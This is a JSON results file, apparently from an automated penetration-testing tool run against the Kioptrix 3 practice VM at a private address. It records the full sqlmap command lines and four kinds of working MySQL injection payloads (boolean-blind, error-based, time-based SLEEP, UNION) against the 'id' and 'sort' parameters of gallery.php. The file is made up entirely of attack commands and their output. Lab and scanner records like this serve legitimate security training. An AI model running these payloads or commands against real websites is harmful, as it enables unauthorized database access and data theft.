{
  "192.168.0.242": {
    "80": {
      "kioptrix3.com": {
        "/gallery/gallery.php": {
          "GET": {
            "id": {
              "sqlmap_call": [
                "sqlmap",
                "-u",
                "http://kioptrix3.com:80/gallery/gallery.php?id=1&sort=avain",
                "--batch",
                "-o",
                "--answers=is vulnerable. Do you want to keep testing the others=Y,crack=N,want to update=N,got a refresh intent=N",
                "--output-dir=sqlmap_out_dir",
                "--threads=4",
                "--user-agent=Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
                "--ignore-code=404",
                "--level=1",
                "--risk=1",
                "-p",
                "id,sort"
              ],
              "sqlis": [
                {
                  "type": "boolean-based blind",
                  "title": "Boolean-based blind - Parameter replace (original value)",
                  "payload": "id=(SELECT (CASE WHEN (7288=7288) THEN 1 ELSE (SELECT 7092 UNION SELECT 3884) END))&sort=avain"
                },
                {
                  "type": "error-based",
                  "title": "MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)",
                  "payload": "id=1 OR ROW(7403,6189)>(SELECT COUNT(*),CONCAT(0x7162626a71,(SELECT (ELT(7403=7403,1))),0x716a6a7171,FLOOR(RAND(0)*2))x FROM (SELECT 1785 UNION SELECT 4081 UNION SELECT 6864 UNION SELECT 7157)a GROUP BY x)&sort=avain"
                },
                {
                  "type": "time-based blind",
                  "title": "MySQL >= 5.0.12 AND time-based blind (query SLEEP)",
                  "payload": "id=1 AND (SELECT 8887 FROM (SELECT(SLEEP(5)))eGXn)&sort=avain"
                },
                {
                  "type": "UNION query",
                  "title": "Generic UNION query (NULL) - 6 columns",
                  "payload": "id=1 UNION ALL SELECT NULL,CONCAT(0x7162626a71,0x65566b706a684258516f47494d6b56797569676b4b4470776775595667447a526546516d43664172,0x716a6a7171),NULL,NULL,NULL,NULL-- -&sort=avain"
                }
              ]
            },
            "sort": {
              "sqlmap_call": [
                "sqlmap",
                "-u",
                "http://kioptrix3.com:80/gallery/gallery.php?id=1&sort=avain",
                "--batch",
                "-o",
                "--answers=is vulnerable. Do you want to keep testing the others=Y,crack=N,want to update=N,got a refresh intent=N",
                "--output-dir=sqlmap_out_dir",
                "--threads=4",
                "--user-agent=Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
                "--ignore-code=404",
                "--level=1",
                "--risk=1",
                "-p",
                "id,sort"
              ],
              "sqlis": [
                {
                  "type": "time-based blind",
                  "title": "MySQL >= 5.0.12 AND time-based blind (query SLEEP)",
                  "payload": "id=1&sort=avain AND (SELECT 6008 FROM (SELECT(SLEEP(5)))YRZE)"
                }
              ]
            }
          }
        }
      }
    }
  }
}